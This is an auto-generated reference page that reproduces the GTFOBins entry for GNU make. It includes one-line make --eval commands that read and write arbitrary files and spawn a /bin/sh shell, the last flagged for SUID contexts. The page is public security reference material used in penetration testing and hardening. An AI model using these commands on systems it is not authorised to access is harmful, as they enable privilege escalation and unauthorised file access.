---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# make

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `make` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/make` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [make](../../tools/linux/make.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | make |
| name | make |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/make/ |

## Preserved Source Material

```yaml
_body: ''
_name: make
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/make
functions:
  file-read:
  - binary: false
    code: make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: GNU
  file-write:
  - code: make -s --eval='$(file >/path/to/output-file,DATA)' .
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: GNU
  shell:
  - code: make --eval='$(shell /bin/sh 1>&0)' .
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    version: GNU
```
